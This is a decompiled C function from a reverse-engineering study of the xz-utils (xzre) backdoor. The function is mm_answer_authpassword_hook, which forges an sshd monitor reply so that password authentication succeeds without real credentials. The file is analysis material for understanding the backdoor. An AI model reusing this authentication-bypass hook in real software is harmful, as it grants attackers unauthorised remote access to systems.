// /home/kali/xzre-ghidra/xzregh/108100_mm_answer_authpassword_hook.c
// Function: mm_answer_authpassword_hook @ 0x108100
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_authpassword_hook(ssh * ssh, int sock, sshbuf * m)


/*
 * AutoDoc: Synthesises a `MONITOR_ANS_AUTHPASSWORD` reply and pushes it to the monitor channel, effectively granting password authentication. `run_backdoor_commands` drops this hook in when the attacker asks for a session without presenting real credentials.
 */
#include "xzre_types.h"


int mm_answer_authpassword_hook(ssh *ssh,int sock,sshbuf *m)

{
  libc_imports_t *funcs;
  long lVar1;
  int iVar2;
  size_t count;
  uint *buffer;
  uint local_15;
  uint uStack_11;
  undefined1 uStack_d;
  undefined4 uStack_c;
  
  local_15 = 0;
  funcs = *(libc_imports_t **)(global_ctx + 0x10);
  lVar1 = *(long *)(global_ctx + 0x20);
  uStack_11 = 0;
  uStack_d = 0;
  uStack_c = 0;
  if ((m == (sshbuf *)0x0 || sock < 0) || (ssh == (ssh *)0x0)) {
    if ((funcs != (libc_imports_t *)0x0) && (funcs->exit != (_func_19 *)0x0)) {
      (*funcs->exit)(0);
    }
    iVar2 = 0;
  }
  else {
    count = (size_t)*(ushort *)(lVar1 + 0x90);
    if ((*(ushort *)(lVar1 + 0x90) == 0) ||
       (buffer = *(uint **)(lVar1 + 0x98), buffer == (uint *)0x0)) {
      buffer = &local_15;
      uStack_d = 1;
      uStack_11 = *(uint *)(lVar1 + 0x40) & 0xff;
      local_15 = (-(uint)(*(int *)(lVar1 + 0xb8) == 0) & 0xfc000000) + 0x9000000;
      count = (ulong)(local_15 >> 0x18) + 4;
    }
    fd_write(sock,buffer,count,funcs);
    **(undefined8 **)(lVar1 + 0xa0) = *(undefined8 *)(lVar1 + 0xd0);
    iVar2 = 1;
  }
  return iVar2;
}

